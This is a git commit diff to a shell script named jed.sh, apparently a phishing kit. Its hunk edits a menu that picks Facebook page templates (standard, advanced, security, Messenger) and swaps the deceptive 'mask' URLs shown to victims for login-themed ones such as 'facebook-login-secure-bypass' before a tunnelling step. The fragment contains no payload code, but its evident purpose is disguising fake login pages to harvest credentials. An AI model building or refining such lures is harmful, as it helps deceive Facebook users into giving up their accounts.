f69f7179895a0c9f826e509d73e381e7275d6b98
Sphinx <104243528+LOLsphinx@users.noreply.github.com>
2022-04-25 22:55:16 +0800

    Update and rename jed.s to jed.sh

--- jed.sh
+++ jed.sh
@@ -358,19 +358,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://facebook-login-secure-bypass'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://facebook-secure-login'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			mask='http://facebook-login-secured'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://get-messenger-premium-features-free'
+			mask='http://facebook-login-bypass-secured'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
